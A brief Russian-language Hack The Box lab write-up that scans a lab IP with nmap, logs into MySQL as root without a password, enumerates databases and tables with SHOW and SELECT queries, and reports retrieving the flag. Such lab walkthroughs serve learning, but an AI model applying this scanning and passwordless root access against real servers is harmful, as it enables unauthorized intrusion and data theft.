HTB MySQL Enumeration & Exploitation

Сканирование целевой машины:

nmap -sV -sC 10.10.10.10 

Подключение к MySQL:

mysql -h 10.10.10.10 -P 3306 -u root

Исследование базы данных:

SHOW DATABASES;
USE имя_базы;
SHOW TABLES;
DESCRIBE имя_таблицы; -- или SHOW COLUMNS FROM имя_таблицы;
SELECT * FROM имя_таблицы;

Флаг получен из базы данных.

